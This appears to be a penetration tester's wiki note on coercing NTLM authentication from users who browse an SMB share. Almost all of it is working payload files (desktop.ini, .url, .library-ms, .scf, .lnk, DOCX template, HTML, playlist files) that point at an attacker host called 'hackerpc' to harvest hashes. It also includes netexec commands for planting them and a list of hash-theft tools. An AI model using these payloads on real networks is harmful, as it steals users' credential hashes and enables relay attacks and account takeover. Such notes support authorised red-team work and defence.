---
title: NTLM Relay from SMB share
---

Create a [[notes/ad/ntlm-relay-source]] by placing special files on SMB shares to coerce NTLM authentication [[notes/ad/ntlm-relay-from-smb|via SMB]] or [[notes/ad/ntlm-relay-from-webdav|via WebDAV]] from anybody who visits that share.

Place one of the following example files on a writable SMB share and be patient while waiting for connections.
If WebDAV doesn't work, try regular SMB.

`desktop.ini`:

~~~
[.ShellClassInfo]
IconResource=\\hackerpc@80\harvest\test.ico,0
~~~

`coerce.url`:

~~~
[InternetShortcut]
URL=http://example.com
IconFile=\\hackerpc@80\harvest\%USERNAME%.ico
IconIndex=1
~~~

`coerce.library-ms`:

~~~ xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
      <url>\\hackerpc@80\harvest</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
~~~

LNK file.

=== "powershell"
    ~~~ powershell
    $shell = New-Object -ComObject WScript.Shell
    $lnk = $shell.CreateShortcut('\\srv01.corp.local\transfer\@test.lnk')
    $lnk.TargetPath = '\\hackerpc\harvest\test.txt'
    $lnk.IconLocation = '%windir%\system32\shell32.dll,3'
    $lnk.Save()
    ~~~

    [source](https://infinitelogins.com/2020/12/17/capturing-password-hashes-via-malicious-lnk-files/)

=== "[[notes/tools/netexec]]"
    ~~~ bash
    netexec smb fs01.corp.local -u jdoe -p 'passw0rd' -M slinky -o NAME=.thumbs.db SERVER=$LHOST
    netexec smb fs01.corp.local -u jdoe -p 'passw0rd' -M slinky -o NAME=.thumbs.db SERVER=$LHOST CLEANUP=true
    ~~~

    [source](http://web.archive.org/web/20230426070201/https://mayfly277.github.io/posts/GOADv2-pwning-part13/)

`coerce.scf`:

~~~ ini
[Shell]
Command=2
IconFile=\\hackerpc\harvest\test.ico
[Taskbar]
Command=ToggleDesktop
~~~

Place a SCF file on a share.

=== "[[notes/tools/netexec]]"
    ~~~ bash
    netexec smb fs01.corp.local -u jdoe -p 'passw0rd' -M scuffy -o NAME=.thumbs.db SERVER=$LHOST
    netexec smb fs01.corp.local -u jdoe -p 'passw0rd' -M scuffy -o NAME=.thumbs.db SERVER=$LHOST CLEANUP=true
    ~~~

    [source](http://web.archive.org/web/20230426070201/https://mayfly277.github.io/posts/GOADv2-pwning-part13/)

All following files trigger NTLM authentication only after the user opened them.

Unpack a DOCX file and modify `word\_rels\settings.xml.rels`:

~~~ xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file://hackerpc@80/leak/template.dotx" TargetMode="External"/>
</Relationships>
~~~

`coerce.html` ([source](https://web.archive.org/web/20210106231759/https://github.com/ShikariSenpai/Leak-NTLM-hash-via-HTML)):

~~~ html
<html>
  <body>
    <svg version="1.1" xmlns="http://www.w3.org/2000/svg">
      <rect cursor="url(file://hackerpc@80/harvest),auto" />
    </svg>
  </body>
</html>
~~~

Office URL handler.

~~~
ms-word:ofe|u|\\hackerpc@80\harvest\test.docx
~~~

Windows Media Player, `coerce.m3u`:

~~~
#EXTM3U
#EXTINF:1337, Leak
\\hackerpc@80\harvest\test.mp3
~~~

Windows Media Player, `coerce.asx`:

~~~ xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://hackerpc@80/harvest/test.wma"/>
  </entry>
</asx>
~~~

Untested tools:

- [ntlmthief](https://github.com/4ndr34z/ntlmthief), generates Word, PowerPoint, Excel and PDF documents that trigger a SMB connection
- [ntlm_theft](https://github.com/Greenwolf/ntlm_theft), generates many different file types that trigger a SMB connection
- [LNKUp](https://github.com/Plazmaz/LNKUp), generate LNK payloads with Python
- [hashgrab](https://github.com/xct/hashgrab), generate SCF, URL and LNK payloads with Python
- [All_NTLM_leak](http://web.archive.org/web/20221123100814/https://github.com/Gl3bGl4z/All_NTLM_leak), link collection

References:

- [GOAD - part 13 - Having fun inside a domain](http://web.archive.org/web/20230426070201/https://mayfly277.github.io/posts/GOADv2-pwning-part13/)
- [Living off the land: stealing NetNTLM hashes](http://web.archive.org/web/20221022111143/https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes/)
